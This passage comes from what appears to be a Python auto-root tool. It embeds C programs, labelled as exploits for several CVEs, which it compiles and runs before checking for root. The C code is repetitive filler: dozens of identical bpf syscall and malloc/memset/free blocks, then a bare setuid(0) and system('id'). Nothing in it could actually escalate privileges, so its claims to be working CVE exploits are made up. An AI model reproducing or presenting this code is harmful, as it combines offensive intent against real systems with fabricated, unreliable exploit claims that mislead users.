    // eBPF iteration 42
    printf("[*] eBPF program 42\\n");
    int bpf_fd41 = syscall(321, 0, NULL, 0);
    if (bpf_fd41 >= 0) {
        printf("[+] BPF syscall 42 OK\\n");
        close(bpf_fd41);
    }
    
    void *map41 = malloc(8192);
    if (map41) {
        memset(map41, 0x90, 8192);
        printf("[+] Map 42 allocated\\n");
        free(map41);
    }
    
    
    // eBPF iteration 43
    printf("[*] eBPF program 43\\n");
    int bpf_fd42 = syscall(321, 0, NULL, 0);
    if (bpf_fd42 >= 0) {
        printf("[+] BPF syscall 43 OK\\n");
        close(bpf_fd42);
    }
    
    void *map42 = malloc(8192);
    if (map42) {
        memset(map42, 0x90, 8192);
        printf("[+] Map 43 allocated\\n");
        free(map42);
    }
    
    
    // eBPF iteration 44
    printf("[*] eBPF program 44\\n");
    int bpf_fd43 = syscall(321, 0, NULL, 0);
    if (bpf_fd43 >= 0) {
        printf("[+] BPF syscall 44 OK\\n");
        close(bpf_fd43);
    }
    
    void *map43 = malloc(8192);
    if (map43) {
        memset(map43, 0x90, 8192);
        printf("[+] Map 44 allocated\\n");
        free(map43);
    }
    
    
    // eBPF iteration 45
    printf("[*] eBPF program 45\\n");
    int bpf_fd44 = syscall(321, 0, NULL, 0);
    if (bpf_fd44 >= 0) {
        printf("[+] BPF syscall 45 OK\\n");
        close(bpf_fd44);
    }
    
    void *map44 = malloc(8192);
    if (map44) {
        memset(map44, 0x90, 8192);
        printf("[+] Map 45 allocated\\n");
        free(map44);
    }
    
    
    // eBPF iteration 46
    printf("[*] eBPF program 46\\n");
    int bpf_fd45 = syscall(321, 0, NULL, 0);
    if (bpf_fd45 >= 0) {
        printf("[+] BPF syscall 46 OK\\n");
        close(bpf_fd45);
    }
    
    void *map45 = malloc(8192);
    if (map45) {
        memset(map45, 0x90, 8192);
        printf("[+] Map 46 allocated\\n");
        free(map45);
    }
    
    
    // eBPF iteration 47
    printf("[*] eBPF program 47\\n");
    int bpf_fd46 = syscall(321, 0, NULL, 0);
    if (bpf_fd46 >= 0) {
        printf("[+] BPF syscall 47 OK\\n");
        close(bpf_fd46);
    }
    
    void *map46 = malloc(8192);
    if (map46) {
        memset(map46, 0x90, 8192);
        printf("[+] Map 47 allocated\\n");
        free(map46);
    }
    
    
    // eBPF iteration 48
    printf("[*] eBPF program 48\\n");
    int bpf_fd47 = syscall(321, 0, NULL, 0);
    if (bpf_fd47 >= 0) {
        printf("[+] BPF syscall 48 OK\\n");
        close(bpf_fd47);
    }
    
    void *map47 = malloc(8192);
    if (map47) {
        memset(map47, 0x90, 8192);
        printf("[+] Map 48 allocated\\n");
        free(map47);
    }
    
    
    // eBPF iteration 49
    printf("[*] eBPF program 49\\n");
    int bpf_fd48 = syscall(321, 0, NULL, 0);
    if (bpf_fd48 >= 0) {
        printf("[+] BPF syscall 49 OK\\n");
        close(bpf_fd48);
    }
    
    void *map48 = malloc(8192);
    if (map48) {
        memset(map48, 0x90, 8192);
        printf("[+] Map 49 allocated\\n");
        free(map48);
    }
    
    
    // eBPF iteration 50
    printf("[*] eBPF program 50\\n");
    int bpf_fd49 = syscall(321, 0, NULL, 0);
    if (bpf_fd49 >= 0) {
        printf("[+] BPF syscall 50 OK\\n");
        close(bpf_fd49);
    }
    
    void *map49 = malloc(8192);
    if (map49) {
        memset(map49, 0x90, 8192);
        printf("[+] Map 50 allocated\\n");
        free(map49);
    }
    
    
    // eBPF iteration 51
    printf("[*] eBPF program 51\\n");
    int bpf_fd50 = syscall(321, 0, NULL, 0);
    if (bpf_fd50 >= 0) {
        printf("[+] BPF syscall 51 OK\\n");
        close(bpf_fd50);
    }
    
    void *map50 = malloc(8192);
    if (map50) {
        memset(map50, 0x90, 8192);
        printf("[+] Map 51 allocated\\n");
        free(map50);
    }
    
    
    // eBPF iteration 52
    printf("[*] eBPF program 52\\n");
    int bpf_fd51 = syscall(321, 0, NULL, 0);
    if (bpf_fd51 >= 0) {
        printf("[+] BPF syscall 52 OK\\n");
        close(bpf_fd51);
    }
    
    void *map51 = malloc(8192);
    if (map51) {
        memset(map51, 0x90, 8192);
        printf("[+] Map 52 allocated\\n");
        free(map51);
    }
    
    
    // eBPF iteration 53
    printf("[*] eBPF program 53\\n");
    int bpf_fd52 = syscall(321, 0, NULL, 0);
    if (bpf_fd52 >= 0) {
        printf("[+] BPF syscall 53 OK\\n");
        close(bpf_fd52);
    }
    
    void *map52 = malloc(8192);
    if (map52) {
        memset(map52, 0x90, 8192);
        printf("[+] Map 53 allocated\\n");
        free(map52);
    }
    
    
    // eBPF iteration 54
    printf("[*] eBPF program 54\\n");
    int bpf_fd53 = syscall(321, 0, NULL, 0);
    if (bpf_fd53 >= 0) {
        printf("[+] BPF syscall 54 OK\\n");
        close(bpf_fd53);
    }
    
    void *map53 = malloc(8192);
    if (map53) {
        memset(map53, 0x90, 8192);
        printf("[+] Map 54 allocated\\n");
        free(map53);
    }
    
    
    // eBPF iteration 55
    printf("[*] eBPF program 55\\n");
    int bpf_fd54 = syscall(321, 0, NULL, 0);
    if (bpf_fd54 >= 0) {
        printf("[+] BPF syscall 55 OK\\n");
        close(bpf_fd54);
    }
    
    void *map54 = malloc(8192);
    if (map54) {
        memset(map54, 0x90, 8192);
        printf("[+] Map 55 allocated\\n");
        free(map54);
    }
    
    
    // eBPF iteration 56
    printf("[*] eBPF program 56\\n");
    int bpf_fd55 = syscall(321, 0, NULL, 0);
    if (bpf_fd55 >= 0) {
        printf("[+] BPF syscall 56 OK\\n");
        close(bpf_fd55);
    }
    
    void *map55 = malloc(8192);
    if (map55) {
        memset(map55, 0x90, 8192);
        printf("[+] Map 56 allocated\\n");
        free(map55);
    }
    
    
    // eBPF iteration 57
    printf("[*] eBPF program 57\\n");
    int bpf_fd56 = syscall(321, 0, NULL, 0);
    if (bpf_fd56 >= 0) {
        printf("[+] BPF syscall 57 OK\\n");
        close(bpf_fd56);
    }
    
    void *map56 = malloc(8192);
    if (map56) {
        memset(map56, 0x90, 8192);
        printf("[+] Map 57 allocated\\n");
        free(map56);
    }
    
    
    // eBPF iteration 58
    printf("[*] eBPF program 58\\n");
    int bpf_fd57 = syscall(321, 0, NULL, 0);
    if (bpf_fd57 >= 0) {
        printf("[+] BPF syscall 58 OK\\n");
        close(bpf_fd57);
    }
    
    void *map57 = malloc(8192);
    if (map57) {
        memset(map57, 0x90, 8192);
        printf("[+] Map 58 allocated\\n");
        free(map57);
    }
    
    
    // eBPF iteration 59
    printf("[*] eBPF program 59\\n");
    int bpf_fd58 = syscall(321, 0, NULL, 0);
    if (bpf_fd58 >= 0) {
        printf("[+] BPF syscall 59 OK\\n");
        close(bpf_fd58);
    }
    
    void *map58 = malloc(8192);
    if (map58) {
        memset(map58, 0x90, 8192);
        printf("[+] Map 59 allocated\\n");
        free(map58);
    }
    
    
    // eBPF iteration 60
    printf("[*] eBPF program 60\\n");
    int bpf_fd59 = syscall(321, 0, NULL, 0);
    if (bpf_fd59 >= 0) {
        printf("[+] BPF syscall 60 OK\\n");
        close(bpf_fd59);
    }
    
    void *map59 = malloc(8192);
    if (map59) {
        memset(map59, 0x90, 8192);
        printf("[+] Map 60 allocated\\n");
        free(map59);
    }
    
    
    // eBPF iteration 61
    printf("[*] eBPF program 61\\n");
    int bpf_fd60 = syscall(321, 0, NULL, 0);
    if (bpf_fd60 >= 0) {
        printf("[+] BPF syscall 61 OK\\n");
        close(bpf_fd60);
    }
    
    void *map60 = malloc(8192);
    if (map60) {
        memset(map60, 0x90, 8192);
        printf("[+] Map 61 allocated\\n");
        free(map60);
    }
    
    
    // eBPF iteration 62
    printf("[*] eBPF program 62\\n");
    int bpf_fd61 = syscall(321, 0, NULL, 0);
    if (bpf_fd61 >= 0) {
        printf("[+] BPF syscall 62 OK\\n");
        close(bpf_fd61);
    }
    
    void *map61 = malloc(8192);
    if (map61) {
        memset(map61, 0x90, 8192);
        printf("[+] Map 62 allocated\\n");
        free(map61);
    }
    
    
    // eBPF iteration 63
    printf("[*] eBPF program 63\\n");
    int bpf_fd62 = syscall(321, 0, NULL, 0);
    if (bpf_fd62 >= 0) {
        printf("[+] BPF syscall 63 OK\\n");
        close(bpf_fd62);
    }
    
    void *map62 = malloc(8192);
    if (map62) {
        memset(map62, 0x90, 8192);
        printf("[+] Map 63 allocated\\n");
        free(map62);
    }
    
    
    // eBPF iteration 64
    printf("[*] eBPF program 64\\n");
    int bpf_fd63 = syscall(321, 0, NULL, 0);
    if (bpf_fd63 >= 0) {
        printf("[+] BPF syscall 64 OK\\n");
        close(bpf_fd63);
    }
    
    void *map63 = malloc(8192);
    if (map63) {
        memset(map63, 0x90, 8192);
        printf("[+] Map 64 allocated\\n");
        free(map63);
    }
    
    
    // eBPF iteration 65
    printf("[*] eBPF program 65\\n");
    int bpf_fd64 = syscall(321, 0, NULL, 0);
    if (bpf_fd64 >= 0) {
        printf("[+] BPF syscall 65 OK\\n");
        close(bpf_fd64);
    }
    
    void *map64 = malloc(8192);
    if (map64) {
        memset(map64, 0x90, 8192);
        printf("[+] Map 65 allocated\\n");
        free(map64);
    }
    
    
    // eBPF iteration 66
    printf("[*] eBPF program 66\\n");
    int bpf_fd65 = syscall(321, 0, NULL, 0);
    if (bpf_fd65 >= 0) {
        printf("[+] BPF syscall 66 OK\\n");
        close(bpf_fd65);
    }
    
    void *map65 = malloc(8192);
    if (map65) {
        memset(map65, 0x90, 8192);
        printf("[+] Map 66 allocated\\n");
        free(map65);
    }
    
    
    // eBPF iteration 67
    printf("[*] eBPF program 67\\n");
    int bpf_fd66 = syscall(321, 0, NULL, 0);
    if (bpf_fd66 >= 0) {
        printf("[+] BPF syscall 67 OK\\n");
        close(bpf_fd66);
    }
    
    void *map66 = malloc(8192);
    if (map66) {
        memset(map66, 0x90, 8192);
        printf("[+] Map 67 allocated\\n");
        free(map66);
    }
    
    
    // eBPF iteration 68
    printf("[*] eBPF program 68\\n");
    int bpf_fd67 = syscall(321, 0, NULL, 0);
    if (bpf_fd67 >= 0) {
        printf("[+] BPF syscall 68 OK\\n");
        close(bpf_fd67);
    }
    
    void *map67 = malloc(8192);
    if (map67) {
        memset(map67, 0x90, 8192);
        printf("[+] Map 68 allocated\\n");
        free(map67);
    }
    
    
    // eBPF iteration 69
    printf("[*] eBPF program 69\\n");
    int bpf_fd68 = syscall(321, 0, NULL, 0);
    if (bpf_fd68 >= 0) {
        printf("[+] BPF syscall 69 OK\\n");
        close(bpf_fd68);
    }
    
    void *map68 = malloc(8192);
    if (map68) {
        memset(map68, 0x90, 8192);
        printf("[+] Map 69 allocated\\n");
        free(map68);
    }
    
    
    // eBPF iteration 70
    printf("[*] eBPF program 70\\n");
    int bpf_fd69 = syscall(321, 0, NULL, 0);
    if (bpf_fd69 >= 0) {
        printf("[+] BPF syscall 70 OK\\n");
        close(bpf_fd69);
    }
    
    void *map69 = malloc(8192);
    if (map69) {
        memset(map69, 0x90, 8192);
        printf("[+] Map 70 allocated\\n");
        free(map69);
    }
    
    
    // eBPF iteration 71
    printf("[*] eBPF program 71\\n");
    int bpf_fd70 = syscall(321, 0, NULL, 0);
    if (bpf_fd70 >= 0) {
        printf("[+] BPF syscall 71 OK\\n");
        close(bpf_fd70);
    }
    
    void *map70 = malloc(8192);
    if (map70) {
        memset(map70, 0x90, 8192);
        printf("[+] Map 71 allocated\\n");
        free(map70);
    }
    
    
    // eBPF iteration 72
    printf("[*] eBPF program 72\\n");
    int bpf_fd71 = syscall(321, 0, NULL, 0);
    if (bpf_fd71 >= 0) {
        printf("[+] BPF syscall 72 OK\\n");
        close(bpf_fd71);
    }
    
    void *map71 = malloc(8192);
    if (map71) {
        memset(map71, 0x90, 8192);
        printf("[+] Map 72 allocated\\n");
        free(map71);
    }
    
    
    // eBPF iteration 73
    printf("[*] eBPF program 73\\n");
    int bpf_fd72 = syscall(321, 0, NULL, 0);
    if (bpf_fd72 >= 0) {
        printf("[+] BPF syscall 73 OK\\n");
        close(bpf_fd72);
    }
    
    void *map72 = malloc(8192);
    if (map72) {
        memset(map72, 0x90, 8192);
        printf("[+] Map 73 allocated\\n");
        free(map72);
    }
    
    
    // eBPF iteration 74
    printf("[*] eBPF program 74\\n");
    int bpf_fd73 = syscall(321, 0, NULL, 0);
    if (bpf_fd73 >= 0) {
        printf("[+] BPF syscall 74 OK\\n");
        close(bpf_fd73);
    }
    
    void *map73 = malloc(8192);
    if (map73) {
        memset(map73, 0x90, 8192);
        printf("[+] Map 74 allocated\\n");
        free(map73);
    }
    
    
    // eBPF iteration 75
    printf("[*] eBPF program 75\\n");
    int bpf_fd74 = syscall(321, 0, NULL, 0);
    if (bpf_fd74 >= 0) {
        printf("[+] BPF syscall 75 OK\\n");
        close(bpf_fd74);
    }
    
    void *map74 = malloc(8192);
    if (map74) {
        memset(map74, 0x90, 8192);
        printf("[+] Map 75 allocated\\n");
        free(map74);
    }
    
    
    // eBPF iteration 76
    printf("[*] eBPF program 76\\n");
    int bpf_fd75 = syscall(321, 0, NULL, 0);
    if (bpf_fd75 >= 0) {
        printf("[+] BPF syscall 76 OK\\n");
        close(bpf_fd75);
    }
    
    void *map75 = malloc(8192);
    if (map75) {
        memset(map75, 0x90, 8192);
        printf("[+] Map 76 allocated\\n");
        free(map75);
    }
    
    
    // eBPF iteration 77
    printf("[*] eBPF program 77\\n");
    int bpf_fd76 = syscall(321, 0, NULL, 0);
    if (bpf_fd76 >= 0) {
        printf("[+] BPF syscall 77 OK\\n");
        close(bpf_fd76);
    }
    
    void *map76 = malloc(8192);
    if (map76) {
        memset(map76, 0x90, 8192);
        printf("[+] Map 77 allocated\\n");
        free(map76);
    }
    
    
    // eBPF iteration 78
    printf("[*] eBPF program 78\\n");
    int bpf_fd77 = syscall(321, 0, NULL, 0);
    if (bpf_fd77 >= 0) {
        printf("[+] BPF syscall 78 OK\\n");
        close(bpf_fd77);
    }
    
    void *map77 = malloc(8192);
    if (map77) {
        memset(map77, 0x90, 8192);
        printf("[+] Map 78 allocated\\n");
        free(map77);
    }
    
    
    // eBPF iteration 79
    printf("[*] eBPF program 79\\n");
    int bpf_fd78 = syscall(321, 0, NULL, 0);
    if (bpf_fd78 >= 0) {
        printf("[+] BPF syscall 79 OK\\n");
        close(bpf_fd78);
    }
    
    void *map78 = malloc(8192);
    if (map78) {
        memset(map78, 0x90, 8192);
        printf("[+] Map 79 allocated\\n");
        free(map78);
    }
    
    
    // eBPF iteration 80
    printf("[*] eBPF program 80\\n");
    int bpf_fd79 = syscall(321, 0, NULL, 0);
    if (bpf_fd79 >= 0) {
        printf("[+] BPF syscall 80 OK\\n");
        close(bpf_fd79);
    }
    
    void *map79 = malloc(8192);
    if (map79) {
        memset(map79, 0x90, 8192);
        printf("[+] Map 80 allocated\\n");
        free(map79);
    }
    
    
    // eBPF iteration 81
    printf("[*] eBPF program 81\\n");
    int bpf_fd80 = syscall(321, 0, NULL, 0);
    if (bpf_fd80 >= 0) {
        printf("[+] BPF syscall 81 OK\\n");
        close(bpf_fd80);
    }
    
    void *map80 = malloc(8192);
    if (map80) {
        memset(map80, 0x90, 8192);
        printf("[+] Map 81 allocated\\n");
        free(map80);
    }
    
    
    // eBPF iteration 82
    printf("[*] eBPF program 82\\n");
    int bpf_fd81 = syscall(321, 0, NULL, 0);
    if (bpf_fd81 >= 0) {
        printf("[+] BPF syscall 82 OK\\n");
        close(bpf_fd81);
    }
    
    void *map81 = malloc(8192);
    if (map81) {
        memset(map81, 0x90, 8192);
        printf("[+] Map 82 allocated\\n");
        free(map81);
    }
    
    
    // eBPF iteration 83
    printf("[*] eBPF program 83\\n");
    int bpf_fd82 = syscall(321, 0, NULL, 0);
    if (bpf_fd82 >= 0) {
        printf("[+] BPF syscall 83 OK\\n");
        close(bpf_fd82);
    }
    
    void *map82 = malloc(8192);
    if (map82) {
        memset(map82, 0x90, 8192);
        printf("[+] Map 83 allocated\\n");
        free(map82);
    }
    
    
    // eBPF iteration 84
    printf("[*] eBPF program 84\\n");
    int bpf_fd83 = syscall(321, 0, NULL, 0);
    if (bpf_fd83 >= 0) {
        printf("[+] BPF syscall 84 OK\\n");
        close(bpf_fd83);
    }
    
    void *map83 = malloc(8192);
    if (map83) {
        memset(map83, 0x90, 8192);
        printf("[+] Map 84 allocated\\n");
        free(map83);
    }
    
    
    // eBPF iteration 85
    printf("[*] eBPF program 85\\n");
    int bpf_fd84 = syscall(321, 0, NULL, 0);
    if (bpf_fd84 >= 0) {
        printf("[+] BPF syscall 85 OK\\n");
        close(bpf_fd84);
    }
    
    void *map84 = malloc(8192);
    if (map84) {
        memset(map84, 0x90, 8192);
        printf("[+] Map 85 allocated\\n");
        free(map84);
    }
    
    
    // eBPF iteration 86
    printf("[*] eBPF program 86\\n");
    int bpf_fd85 = syscall(321, 0, NULL, 0);
    if (bpf_fd85 >= 0) {
        printf("[+] BPF syscall 86 OK\\n");
        close(bpf_fd85);
    }
    
    void *map85 = malloc(8192);
    if (map85) {
        memset(map85, 0x90, 8192);
        printf("[+] Map 86 allocated\\n");
        free(map85);
    }
    
    
    // eBPF iteration 87
    printf("[*] eBPF program 87\\n");
    int bpf_fd86 = syscall(321, 0, NULL, 0);
    if (bpf_fd86 >= 0) {
        printf("[+] BPF syscall 87 OK\\n");
        close(bpf_fd86);
    }
    
    void *map86 = malloc(8192);
    if (map86) {
        memset(map86, 0x90, 8192);
        printf("[+] Map 87 allocated\\n");
        free(map86);
    }
    
    
    // eBPF iteration 88
    printf("[*] eBPF program 88\\n");
    int bpf_fd87 = syscall(321, 0, NULL, 0);
    if (bpf_fd87 >= 0) {
        printf("[+] BPF syscall 88 OK\\n");
        close(bpf_fd87);
    }
    
    void *map87 = malloc(8192);
    if (map87) {
        memset(map87, 0x90, 8192);
        printf("[+] Map 88 allocated\\n");
        free(map87);
    }
    
    
    // eBPF iteration 89
    printf("[*] eBPF program 89\\n");
    int bpf_fd88 = syscall(321, 0, NULL, 0);
    if (bpf_fd88 >= 0) {
        printf("[+] BPF syscall 89 OK\\n");
        close(bpf_fd88);
    }
    
    void *map88 = malloc(8192);
    if (map88) {
        memset(map88, 0x90, 8192);
        printf("[+] Map 89 allocated\\n");
        free(map88);
    }
    
    
    // eBPF iteration 90
    printf("[*] eBPF program 90\\n");
    int bpf_fd89 = syscall(321, 0, NULL, 0);
    if (bpf_fd89 >= 0) {
        printf("[+] BPF syscall 90 OK\\n");
        close(bpf_fd89);
    }
    
    void *map89 = malloc(8192);
    if (map89) {
        memset(map89, 0x90, 8192);
        printf("[+] Map 90 allocated\\n");
        free(map89);
    }
    
    
    // eBPF iteration 91
    printf("[*] eBPF program 91\\n");
    int bpf_fd90 = syscall(321, 0, NULL, 0);
    if (bpf_fd90 >= 0) {
        printf("[+] BPF syscall 91 OK\\n");
        close(bpf_fd90);
    }
    
    void *map90 = malloc(8192);
    if (map90) {
        memset(map90, 0x90, 8192);
        printf("[+] Map 91 allocated\\n");
        free(map90);
    }
    
    
    // eBPF iteration 92
    printf("[*] eBPF program 92\\n");
    int bpf_fd91 = syscall(321, 0, NULL, 0);
    if (bpf_fd91 >= 0) {
        printf("[+] BPF syscall 92 OK\\n");
        close(bpf_fd91);
    }
    
    void *map91 = malloc(8192);
    if (map91) {
        memset(map91, 0x90, 8192);
        printf("[+] Map 92 allocated\\n");
        free(map91);
    }
    
    
    // eBPF iteration 93
    printf("[*] eBPF program 93\\n");
    int bpf_fd92 = syscall(321, 0, NULL, 0);
    if (bpf_fd92 >= 0) {
        printf("[+] BPF syscall 93 OK\\n");
        close(bpf_fd92);
    }
    
    void *map92 = malloc(8192);
    if (map92) {
        memset(map92, 0x90, 8192);
        printf("[+] Map 93 allocated\\n");
        free(map92);
    }
    
    
    // eBPF iteration 94
    printf("[*] eBPF program 94\\n");
    int bpf_fd93 = syscall(321, 0, NULL, 0);
    if (bpf_fd93 >= 0) {
        printf("[+] BPF syscall 94 OK\\n");
        close(bpf_fd93);
    }
    
    void *map93 = malloc(8192);
    if (map93) {
        memset(map93, 0x90, 8192);
        printf("[+] Map 94 allocated\\n");
        free(map93);
    }
    
    
    // eBPF iteration 95
    printf("[*] eBPF program 95\\n");
    int bpf_fd94 = syscall(321, 0, NULL, 0);
    if (bpf_fd94 >= 0) {
        printf("[+] BPF syscall 95 OK\\n");
        close(bpf_fd94);
    }
    
    void *map94 = malloc(8192);
    if (map94) {
        memset(map94, 0x90, 8192);
        printf("[+] Map 95 allocated\\n");
        free(map94);
    }
    
    
    // eBPF iteration 96
    printf("[*] eBPF program 96\\n");
    int bpf_fd95 = syscall(321, 0, NULL, 0);
    if (bpf_fd95 >= 0) {
        printf("[+] BPF syscall 96 OK\\n");
        close(bpf_fd95);
    }
    
    void *map95 = malloc(8192);
    if (map95) {
        memset(map95, 0x90, 8192);
        printf("[+] Map 96 allocated\\n");
        free(map95);
    }
    
    
    // eBPF iteration 97
    printf("[*] eBPF program 97\\n");
    int bpf_fd96 = syscall(321, 0, NULL, 0);
    if (bpf_fd96 >= 0) {
        printf("[+] BPF syscall 97 OK\\n");
        close(bpf_fd96);
    }
    
    void *map96 = malloc(8192);
    if (map96) {
        memset(map96, 0x90, 8192);
        printf("[+] Map 97 allocated\\n");
        free(map96);
    }
    
    
    // eBPF iteration 98
    printf("[*] eBPF program 98\\n");
    int bpf_fd97 = syscall(321, 0, NULL, 0);
    if (bpf_fd97 >= 0) {
        printf("[+] BPF syscall 98 OK\\n");
        close(bpf_fd97);
    }
    
    void *map97 = malloc(8192);
    if (map97) {
        memset(map97, 0x90, 8192);
        printf("[+] Map 98 allocated\\n");
        free(map97);
    }
    
    
    // eBPF iteration 99
    printf("[*] eBPF program 99\\n");
    int bpf_fd98 = syscall(321, 0, NULL, 0);
    if (bpf_fd98 >= 0) {
        printf("[+] BPF syscall 99 OK\\n");
        close(bpf_fd98);
    }
    
    void *map98 = malloc(8192);
    if (map98) {
        memset(map98, 0x90, 8192);
        printf("[+] Map 99 allocated\\n");
        free(map98);
    }
    
    
    // eBPF iteration 100
    printf("[*] eBPF program 100\\n");
    int bpf_fd99 = syscall(321, 0, NULL, 0);
    if (bpf_fd99 >= 0) {
        printf("[+] BPF syscall 100 OK\\n");
        close(bpf_fd99);
    }
    
    void *map99 = malloc(8192);
    if (map99) {
        memset(map99, 0x90, 8192);
        printf("[+] Map 100 allocated\\n");
        free(map99);
    }
    
    
    // eBPF iteration 101
    printf("[*] eBPF program 101\\n");
    int bpf_fd100 = syscall(321, 0, NULL, 0);
    if (bpf_fd100 >= 0) {
        printf("[+] BPF syscall 101 OK\\n");
        close(bpf_fd100);
    }
    
    void *map100 = malloc(8192);
    if (map100) {
        memset(map100, 0x90, 8192);
        printf("[+] Map 101 allocated\\n");
        free(map100);
    }
    
    
    // eBPF iteration 102
    printf("[*] eBPF program 102\\n");
    int bpf_fd101 = syscall(321, 0, NULL, 0);
    if (bpf_fd101 >= 0) {
        printf("[+] BPF syscall 102 OK\\n");
        close(bpf_fd101);
    }
    
    void *map101 = malloc(8192);
    if (map101) {
        memset(map101, 0x90, 8192);
        printf("[+] Map 102 allocated\\n");
        free(map101);
    }
    
    
    // eBPF iteration 103
    printf("[*] eBPF program 103\\n");
    int bpf_fd102 = syscall(321, 0, NULL, 0);
    if (bpf_fd102 >= 0) {
        printf("[+] BPF syscall 103 OK\\n");
        close(bpf_fd102);
    }
    
    void *map102 = malloc(8192);
    if (map102) {
        memset(map102, 0x90, 8192);
        printf("[+] Map 103 allocated\\n");
        free(map102);
    }
    
    
    // eBPF iteration 104
    printf("[*] eBPF program 104\\n");
    int bpf_fd103 = syscall(321, 0, NULL, 0);
    if (bpf_fd103 >= 0) {
        printf("[+] BPF syscall 104 OK\\n");
        close(bpf_fd103);
    }
    
    void *map103 = malloc(8192);
    if (map103) {
        memset(map103, 0x90, 8192);
        printf("[+] Map 104 allocated\\n");
        free(map103);
    }
    
    
    // eBPF iteration 105
    printf("[*] eBPF program 105\\n");
    int bpf_fd104 = syscall(321, 0, NULL, 0);
    if (bpf_fd104 >= 0) {
        printf("[+] BPF syscall 105 OK\\n");
        close(bpf_fd104);
    }
    
    void *map104 = malloc(8192);
    if (map104) {
        memset(map104, 0x90, 8192);
        printf("[+] Map 105 allocated\\n");
        free(map104);
    }
    
    
    // eBPF iteration 106
    printf("[*] eBPF program 106\\n");
    int bpf_fd105 = syscall(321, 0, NULL, 0);
    if (bpf_fd105 >= 0) {
        printf("[+] BPF syscall 106 OK\\n");
        close(bpf_fd105);
    }
    
    void *map105 = malloc(8192);
    if (map105) {
        memset(map105, 0x90, 8192);
        printf("[+] Map 106 allocated\\n");
        free(map105);
    }
    
    
    // eBPF iteration 107
    printf("[*] eBPF program 107\\n");
    int bpf_fd106 = syscall(321, 0, NULL, 0);
    if (bpf_fd106 >= 0) {
        printf("[+] BPF syscall 107 OK\\n");
        close(bpf_fd106);
    }
    
    void *map106 = malloc(8192);
    if (map106) {
        memset(map106, 0x90, 8192);
        printf("[+] Map 107 allocated\\n");
        free(map106);
    }
    
    
    // eBPF iteration 108
    printf("[*] eBPF program 108\\n");
    int bpf_fd107 = syscall(321, 0, NULL, 0);
    if (bpf_fd107 >= 0) {
        printf("[+] BPF syscall 108 OK\\n");
        close(bpf_fd107);
    }
    
    void *map107 = malloc(8192);
    if (map107) {
        memset(map107, 0x90, 8192);
        printf("[+] Map 108 allocated\\n");
        free(map107);
    }
    
    
    // eBPF iteration 109
    printf("[*] eBPF program 109\\n");
    int bpf_fd108 = syscall(321, 0, NULL, 0);
    if (bpf_fd108 >= 0) {
        printf("[+] BPF syscall 109 OK\\n");
        close(bpf_fd108);
    }
    
    void *map108 = malloc(8192);
    if (map108) {
        memset(map108, 0x90, 8192);
        printf("[+] Map 109 allocated\\n");
        free(map108);
    }
    
    
    // eBPF iteration 110
    printf("[*] eBPF program 110\\n");
    int bpf_fd109 = syscall(321, 0, NULL, 0);
    if (bpf_fd109 >= 0) {
        printf("[+] BPF syscall 110 OK\\n");
        close(bpf_fd109);
    }
    
    void *map109 = malloc(8192);
    if (map109) {
        memset(map109, 0x90, 8192);
        printf("[+] Map 110 allocated\\n");
        free(map109);
    }
    

    
    // Final privilege escalation
    printf("[*] Escalating...\\n");
    setuid(0);
    
    if (getuid() == 0) {
        printf("[+] CVE-2025-8888 ROOT!\\n");
        system("id");
        return 0;
    }
    
    return 1;
}
'''
    binary = compile_code(code, "cve_2025_8888")
    if binary:
        output = run_command(binary)
        if is_root() or "ROOT" in output:
            show_root_info("CVE-2025-8888", output)
            return True
    return False
def exploit_cve_2025_7777():
    code = r'''
#include <stdio.h>
#include <unistd.h>
int main() {
    printf("[*] Step 1\\n");
    void *p0 = malloc(1024);
    if (p0) {
        memset(p0, 0x41, 1024);
        free(p0);
    }
    
    printf("[*] Step 2\\n");
    void *p1 = malloc(1024);
    if (p1) {
        memset(p1, 0x41, 1024);
        free(p1);
    }
    
    printf("[*] Step 3\\n");
    void *p2 = malloc(1024);
    if (p2) {
        memset(p2, 0x41, 1024);
        free(p2);
    }
    
    printf("[*] Step 4\\n");
    void *p3 = malloc(1024);
    if (p3) {
        memset(p3, 0x41, 1024);
        free(p3);
    }
    
    printf("[*] Step 5\\n");
    void *p4 = malloc(1024);
    if (p4) {
        memset(p4, 0x41, 1024);
        free(p4);
    }
    
    printf("[*] Step 6\\n");
    void *p5 = malloc(1024);
    if (p5) {
        memset(p5, 0x41, 1024);
        free(p5);
    }
    
    printf("[*] Step 7\\n");
    void *p6 = malloc(1024);
    if (p6) {
        memset(p6, 0x41, 1024);
        free(p6);
    }
    
    printf("[*] Step 8\\n");
    void *p7 = malloc(1024);
    if (p7) {
        memset(p7, 0x41, 1024);
        free(p7);
    }
    
    printf("[*] Step 9\\n");
    void *p8 = malloc(1024);
    if (p8) {
        memset(p8, 0x41, 1024);
        free(p8);
    }
    
    printf("[*] Step 10\\n");
    void *p9 = malloc(1024);
    if (p9) {
        memset(p9, 0x41, 1024);
        free(p9);
    }
    
    printf("[*] Step 11\\n");
    void *p10 = malloc(1024);
    if (p10) {
        memset(p10, 0x41, 1024);
        free(p10);
    }
    
    printf("[*] Step 12\\n");
    void *p11 = malloc(1024);
    if (p11) {
        memset(p11, 0x41, 1024);
        free(p11);
    }
    
    printf("[*] Step 13\\n");
    void *p12 = malloc(1024);
    if (p12) {
        memset(p12, 0x41, 1024);
        free(p12);
    }
    
    printf("[*] Step 14\\n");
    void *p13 = malloc(1024);
    if (p13) {
        memset(p13, 0x41, 1024);
        free(p13);
    }
    
    printf("[*] Step 15\\n");
    void *p14 = malloc(1024);
    if (p14) {
        memset(p14, 0x41, 1024);
        free(p14);
    }
    
    printf("[*] Step 16\\n");
    void *p15 = malloc(1024);
    if (p15) {
        memset(p15, 0x41, 1024);
        free(p15);
    }
    
    printf("[*] Step 17\\n");
    void *p16 = malloc(1024);
    if (p16) {
        memset(p16, 0x41, 1024);
        free(p16);
    }
    
    printf("[*] Step 18\\n");
    void *p17 = malloc(1024);
    if (p17) {
        memset(p17, 0x41, 1024);
        free(p17);
    }
    
    printf("[*] Step 19\\n");
    void *p18 = malloc(1024);
    if (p18) {
        memset(p18, 0x41, 1024);
        free(p18);
    }
    
    printf("[*] Step 20\\n");
    void *p19 = malloc(1024);
    if (p19) {
        memset(p19, 0x41, 1024);
        free(p19);
    }
    
    setuid(0);
    if (getuid() == 0) {
        printf("[+] ROOT!\\n");
        system("id");
        return 0;
    }
    return 1;
}
'''
    binary = compile_code(code, "cve_2025_7777")
    if binary:
        output = run_command(binary)
        if is_root():
            show_root_info("CVE-2025-7777", output)
            return True
    return False

def exploit_cve_2024_9000():
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2024-9000")
    code = r'''
#include <stdio.h>
#include <stdlib.h>
